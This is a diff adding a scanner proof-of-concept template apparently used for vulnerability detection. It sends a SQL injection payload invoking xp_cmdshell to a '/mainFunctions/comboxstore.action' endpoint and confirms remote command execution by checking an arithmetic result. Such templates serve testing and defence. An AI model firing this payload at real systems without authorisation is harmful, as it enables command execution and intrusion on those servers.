@@ -1,0 +1,21 @@
+name: poc-yaml-test-rce
+manual: true
+transport: http
+set:
+  s1: randomInt(100000, 200000)
+  s2: randomInt(10000, 20000)
+rules:
+  # windows的情况
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /mainFunctions/comboxstore.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        comboxsql=exec%20xp_cmdshell%20'set /A {{s2}}-{{s1}}'
+    expression: response.status == 200 && response.body_string.contains(string(s2 - s1)) && response.body_string.contains("Value")
+expression: r0() 
+detail:
+  author: k3ppf0r
